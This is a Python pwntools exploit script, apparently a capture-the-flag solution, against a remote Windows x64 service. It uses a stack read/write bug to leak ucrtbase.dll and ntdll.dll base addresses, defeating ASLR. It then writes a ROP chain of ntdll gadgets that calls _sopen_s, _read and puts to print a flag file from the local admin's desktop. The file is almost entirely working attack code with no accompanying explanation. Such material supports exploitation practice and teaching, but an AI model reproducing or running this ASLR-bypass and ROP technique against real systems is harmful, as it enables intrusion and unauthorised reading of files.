from pwn import *


RET_ADDR_OFFSET = 8  # position relative to 'val' stack variable


# null terminated str to int
def str_to_intl(str: str) -> list:
    str = str.encode()
    ls = []
    while str:
        ls.append(int.from_bytes(reversed(str[:8].ljust(8, b'\x00')), 'big'))
        str = str[8:]
    ls.append(0)
    return ls


def recv_line(p, n=0) -> str:
    if n == 0:
        return p.recvline().decode().strip()
    return p.recvn(n).decode().strip()


def read_stack(p, pos) -> int:
    recv_line(p)  # Do
    p.sendline(b'r')  # read
    recv_line(p, len('pos: '))
    p.sendline(f'{pos}'.encode())
    stack_var = recv_line(p)
    stack_var = ''.join([c for c in stack_var if c.isdigit() or c == '-'])
    return int(stack_var)


def write_stack(p, pos, val):
    recv_line(p)  # Do
    p.sendline(b'w')
    recv_line(p, len('pos: '))
    p.sendline(f'{pos}'.encode())  # position relative to 'val' stack variable
    recv_line(p, len('val: '))
    p.sendline(f'{val}'.encode())


def main():
    p = remote('<ip>', 4444)
    print(recv_line(p))  # Hello-World

    # [rsp - 0x3C0] = [rsp - (5 * 8) - (115 * 8)] = ptr[-120]
    ucrtbasedll_base_addr = read_stack(p, -120) - 0x36 - 0xff70
    print(f'ucrtbase.dll base address: 0x{ucrtbasedll_base_addr:x}')

    # [rsp + 0xD8] = [rsp + 27 * 8] = ptr[22]
    ntdll_base_addr = read_stack(p, 22) - 0x2B - 0x7e3b0
    print(f'ntdll.dll base address: 0x{ntdll_base_addr:x}')

    # rsp when reached ret in main
    stack_addr = read_stack(p, -27) - 0x20 + 0x68
    print(f'stack address on return: 0x{stack_addr:x}')

    ntdll_pop_rop_addr = ntdll_base_addr + 0x8e190
    ntdll_clean_stack_addr = ntdll_base_addr + 0x7829E

    ucrtbasedll_sopen_s_addr = ucrtbasedll_base_addr + 0x28000
    ucrtbasedll_read_addr = ucrtbasedll_base_addr + 0x7650
    ucrtbasedll_puts_addr = ucrtbasedll_base_addr + 0x8f8a0
    ucrtbasedll_flush_addr = ucrtbasedll_base_addr + 0x7eee0


    STACK_ROP_CHAIN = [
        ntdll_pop_rop_addr,                                       # pop rdx ; pop rcx ; pop r8 ; pop r9 ; pop r10 ; pop r11 ; ret
        'file_name_ptr',                                          # param_2_rdx
        'file_handle_ptr',                                        # param_1_rcx
        0x0,                                                      # param_3_r8
        0x40,                                                     # param_4_r9
        0x0,                                                      # junk
        0x0,                                                      # junk

        ucrtbasedll_sopen_s_addr,                                 # _sopen_s
        ntdll_clean_stack_addr,                                   # add rsp, 0x38; ret
        0x0,                                                      # shadow
        0x0,                                                      # shadow
        0x0,                                                      # shadow
        0x0,                                                      # shadow
        0x100,                                                    # param_5_stack
        0x0,                                                      # junk
        0x0,                                                      # junk

        ntdll_pop_rop_addr,                                       # pop rdx ; pop rcx ; pop r8 ; pop r9 ; pop r10 ; pop r11 ; ret
        'dest_buff_ptr',                                          # param_2_rdx
        'file_handle',                                            # param_1_rcx
        0x80,                                                     # param_3_r8
        0x0,                                                      # junk
        0x0,                                                      # junk
        0x0,                                                      # junk

        ucrtbasedll_read_addr,                                    # _read
        ntdll_clean_stack_addr,                                   # add rsp, 0x38; ret
        0x0,                                                      # shadow
        0x0,                                                      # shadow
        0x0,                                                      # shadow
        0x0,                                                      # shadow
        0x0,                                                      # junk
        0x0,                                                      # junk
        0x0,                                                      # junk

        ntdll_pop_rop_addr,                                       # pop rdx ; pop rcx ; pop r8 ; pop r9 ; pop r10 ; pop r11 ; ret
        0x0,
        'dest_buff_ptr',
        0x0,
        0x0,
        0x0,
        0x0,

        ucrtbasedll_puts_addr,                                    # puts
        ntdll_clean_stack_addr,                                   # add rsp, 0x38; ret
        0x0,                                                      # shadow
        0x0,                                                      # shadow
        0x0,                                                      # shadow
        0x0,                                                      # shadow
        0x0,                                                      # junk
        0x0,                                                      # junk
        0x0,                                                      # junk

        ucrtbasedll_flush_addr,                                   # flush
        ntdll_clean_stack_addr,                                   # return address, don't care anyway. shadow space is also not necessary
        0x0,                                                      # shadow
        0x0,                                                      # shadow
        0x0,                                                      # shadow
        0x0,                                                      # shadow
        0x0,                                                      # junk
        0x0,                                                      # junk
        0x0,                                                      # junk

       'file_name',
    ] + 16 * [0x0]  # dest_buff

    STACK_ROP_CHAIN[STACK_ROP_CHAIN.index('file_handle_ptr')] = stack_addr + 8 * STACK_ROP_CHAIN.index('file_handle')
    STACK_ROP_CHAIN[STACK_ROP_CHAIN.index('file_handle')] = 0x0

    int_cmd_name = 'C:\\Users\\localadmin\\Desktop\\flag.txt'

    STACK_ROP_CHAIN[STACK_ROP_CHAIN.index('file_name_ptr')] = stack_addr + 8 * STACK_ROP_CHAIN.index('file_name')
    STACK_ROP_CHAIN[STACK_ROP_CHAIN.index('file_name'):STACK_ROP_CHAIN.index('file_name') + 1] = str_to_intl(int_cmd_name)

    STACK_ROP_CHAIN[STACK_ROP_CHAIN.index('dest_buff_ptr')] = stack_addr + 8 * (len(STACK_ROP_CHAIN) - 16)
    STACK_ROP_CHAIN[STACK_ROP_CHAIN.index('dest_buff_ptr')] = stack_addr + 8 * (len(STACK_ROP_CHAIN) - 16)

    for j, s in enumerate(STACK_ROP_CHAIN):
        # print(f'{j}: {s}')
        write_stack(p, RET_ADDR_OFFSET + j, s)

    recv_line(p)  # Do
    p.sendline(b'x')  # start rop chain

    print(f"FLAG: {recv_line(p)}")


if __name__ == '__main__':
    main()


